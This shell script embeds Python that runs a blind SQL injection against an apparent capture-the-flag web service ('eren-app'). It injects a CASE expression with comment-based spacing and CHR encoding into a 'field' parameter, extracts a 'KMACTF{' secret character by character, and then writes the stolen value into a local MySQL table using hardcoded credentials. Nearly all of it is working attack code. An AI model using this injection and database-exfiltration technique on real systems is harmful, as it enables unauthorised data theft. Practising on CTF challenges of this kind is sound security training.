#!/bin/sh
/usr/bin/python3 - <<'PY'
import string
import subprocess
from urllib.error import HTTPError
from urllib.parse import urlencode
from urllib.request import urlopen

BASE = 'http://eren-app:3000/api/faction/scan'
CHARSET = string.ascii_letters + string.digits + '_{}-!@#$%^&*().,:;[]% '
flag = 'KMACTF{'

def sql_quote(s):
    return "'" + s.replace("'", "''") + "'"

def escape_like_prefix(s):
    return s.replace('!', '!!').replace('%', '!%').replace('_', '!_')

def check_prefix(prefix):
    parts = []
    for ch in prefix:
        if ch in "!%_":
            parts.append("CHR(33)")
        parts.append("CHR(%d)" % ord(ch))
    pattern = "||".join(parts + ["'%'"])
    condition = (
        "(SELECT/**/COUNT(1)/**/FROM/**/FLAG_FACTION"
        "/**/WHERE/**/SECRET/**/LIKE/**/" + pattern +
        "/**/ESCAPE/**/CHR(33))>0"
    )
    field = (
        'CREATED_AT"||CASE/**/WHEN/**/' + condition +
        "/**/THEN/**/'A'/**/ELSE/**/TO_CHAR(TO_NUMBER('x'))/**/END||" +
        '"CREATED_AT'
    )
    url = BASE + '?' + urlencode({'field': field})
    try:
        body = urlopen(url, timeout=8).read().decode('utf-8', 'replace')
    except HTTPError as e:
        if e.code == 500:
            return False
        open('/tmp/eren_flag_status.txt', 'a').write('http_error=%r\n' % (e,))
        return False
    except Exception as e:
        open('/tmp/eren_flag_status.txt', 'a').write('request_error=%r\n' % (e,))
        return False
    return '"success":true' in body

open('/tmp/eren_flag_status.txt', 'w').write('start\n')
if not check_prefix(flag):
    open('/tmp/eren_flag_status.txt', 'a').write('bad_initial_prefix=' + flag + '\n')
else:
    for _ in range(120):
        if flag.endswith('}'):
            break
        for ch in CHARSET:
            if check_prefix(flag + ch):
                flag += ch
                open('/tmp/eren_flag_status.txt', 'a').write('prefix=' + flag + '\n')
                break
        else:
            open('/tmp/eren_flag_status.txt', 'a').write('no_char_after=' + flag + '\n')
            break

safe_flag = flag.replace("'", "''")
sql = "INSERT INTO user (username,email) VALUES ('eren_flag','%s') ON DUPLICATE KEY UPDATE email=VALUES(email)" % safe_flag
subprocess.run(['/usr/bin/mysql', '-h127.0.0.1', '-uuser', '-ppassword', 'mydb', '-e', sql], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
open('/tmp/eren_flag_status.txt', 'a').write('final=' + flag + '\n')
PY
